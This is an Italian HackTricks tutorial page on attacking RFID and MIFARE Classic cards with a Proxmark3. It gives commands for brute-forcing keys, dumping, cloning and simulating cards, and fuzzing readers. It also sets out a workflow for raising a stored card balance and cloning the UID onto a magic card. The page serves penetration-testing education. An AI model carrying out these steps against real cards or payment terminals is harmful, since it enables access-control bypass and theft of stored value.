# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attaccare i sistemi RFID con Proxmark3

La prima cosa da fare è procurarsi un [**Proxmark3**](https://proxmark.com) e [**installare il software e le relative dipendenze**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attaccare MIFARE Classic 1KB

Dispone di **16 settori**, ognuno dei quali ha **4 blocchi**, e ogni blocco contiene **16B**. L'UID si trova nel settore 0, blocco 0 (e non può essere modificato).\
Per accedere a ogni settore sono necessarie **2 chiavi** (**A** e **B**), memorizzate nel **blocco 3 di ogni settore** (sector trailer). Il sector trailer memorizza anche gli **access bits**, che determinano i permessi di **lettura e scrittura** su **ogni blocco** usando le 2 chiavi.\
2 chiavi sono utili per concedere i permessi di lettura se si conosce la prima e di scrittura se si conosce la seconda (ad esempio).

È possibile eseguire diversi attacchi
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 permette di eseguire altre azioni, come **intercettare** una **comunicazione Tag-to-Reader**, per cercare di trovare dati sensibili. In questo caso è sufficiente sniffare la comunicazione e calcolare la chiave utilizzata, perché le **operazioni crittografiche usate sono deboli** e, conoscendo il testo in chiaro e quello cifrato, è possibile calcolarla (tool `mfkey64`).<sup>[[3]](#references)</sup>

#### Workflow rapido di MiFare Classic per l'abuso del valore memorizzato

Quando i terminali memorizzano i saldi sulle card Classic, un tipico flusso end-to-end è:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Note

- `hf mf autopwn` orchestra attacchi di tipo nested/darkside/HardNested, recupera le chiavi e crea dump nella cartella dei dump del client.<sup>[[1]](#references)</sup>
- La scrittura del blocco 0/UID funziona solo sulle card magic gen1a/gen2. Le card Classic normali hanno un UID di sola lettura.<sup>[[2]](#references)</sup>
- Molte implementazioni usano "value blocks" Classic o checksum semplici. Assicurati che tutti i campi duplicati/complementati e i checksum siano coerenti dopo la modifica.<sup>[[4]](#references)</sup>

Consulta una metodologia di livello superiore e le relative mitigazioni in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Comandi raw

I sistemi IoT a volte usano **tag non brandizzati o non commerciali**. In questo caso, puoi usare Proxmark3 per inviare **comandi raw personalizzati ai tag**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Con queste informazioni potresti provare a cercare informazioni sulla card e sul modo di comunicare con essa. Proxmark3 consente di inviare comandi raw come: `hf 14a raw -p -b 7 26`

### Script

Il software Proxmark3 include un elenco preloaded di **script di automazione** che puoi usare per eseguire attività semplici. Per recuperare l’elenco completo, usa il comando `script list`. Successivamente, usa il comando `script run`, seguito dal nome dello script:
```
proxmark3> script run mfkeys
```
Puoi creare uno script per fare il **fuzzing dei lettori di tag**: dopo aver copiato i dati di una **valid card**, basta scrivere uno **script Lua** che **randomizzi** uno o più **byte** casuali e verificare se il **reader va in crash** a ogni iterazione.

## Riferimenti

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Dichiarazione di NXP su MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Sfruttamento della vulnerabilità delle NFC card in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
